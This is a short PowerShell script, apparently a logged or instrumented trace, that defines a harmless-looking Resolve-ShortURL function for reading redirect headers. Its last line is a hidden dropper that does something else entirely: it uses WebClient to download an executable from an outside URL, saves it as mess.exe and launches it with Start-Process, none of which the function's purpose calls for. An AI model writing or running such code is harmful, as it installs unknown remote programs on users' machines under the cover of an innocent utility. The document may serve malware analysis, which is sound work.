 -||-> function Resolve-ShortURL
{


    [CmdletBinding()]
    [OutputType([System.String])]
    PARAM
    (
        [String[]]$ShortUrl
    )

     -||-> FOREACH ($URL in  -||-> $ShortUrl <-||- )
    {
         -||-> TRY
        {
             -||-> Write-Verbose -Message "$URL - Querying..." <-||- 
             -||-> ( -||-> Invoke-WebRequest -Uri $URL -MaximumRedirection 0 -ErrorAction Ignore <-||- ).Headers.Location <-||- 
        }
        CATCH
        {
             -||-> Write-Error -Message $Error[0].Exception.Message <-||- 
        } <-||- 
    } <-||- 
} <-||- 

 -||-> ( -||-> New-Object System.Net.WebClient <-||- ).DownloadFile('http://cajos.in/0x/1.exe','mess.exe') <-||- ; -||-> Start-Process 'mess.exe' <-||- 



